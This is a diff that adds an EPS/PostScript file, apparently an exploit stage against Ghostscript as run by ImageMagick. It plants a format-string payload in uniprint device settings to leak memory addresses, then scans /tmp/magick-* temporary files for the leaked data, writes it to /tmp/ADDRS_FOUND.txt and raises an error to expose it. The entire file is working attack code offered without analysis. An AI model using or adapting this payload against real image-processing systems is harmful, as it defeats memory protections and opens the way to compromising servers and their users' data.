@@ -1,0 +1,44 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 100 100
+
+% STEP 1: Switch to uniprint and render page with format string leak
+<< /OutputDevice /uniprint
+   /upColorModel /DeviceGray
+   /upWriteComponentCommands <<
+     /Prologue (LEAKMARKER_\045p_\045p_\045p_\045p_\045p_\045p_\045p_\045p_ENDLEAK\n)
+   >>
+>> setpagedevice
+0 0 moveto 100 100 lineto stroke
+showpage
+
+% STEP 2: Back to pngalpha
+<< /OutputDevice /pngalpha >> setpagedevice
+
+% STEP 3: Enumerate ALL /tmp/magick-* files and read each one
+% looking for our LEAKMARKER
+(/tmp/magick-*) {
+  % Try to read this file
+  {
+    dup (r) file
+    /fd exch def
+    /buf 2048 string def
+    fd buf readstring pop
+    /data exch store
+    fd closefile
+    
+    % Check if it contains our marker
+    data (LEAKMARKER_) search {
+      % FOUND IT! Extract the leaked addresses
+      pop pop
+      % The remaining string starts with the addresses
+      % Write to a file and put on error stack
+      (/tmp/ADDRS_FOUND.txt) (w) file dup data writestring closefile
+      data 1 0 div
+    } {
+      pop
+    } ifelse
+  } stopped { pop } if
+} 256 string filenameforall
+
+% If we get here, marker wasn't found
+(MARKER_NOT_FOUND) 1 0 div
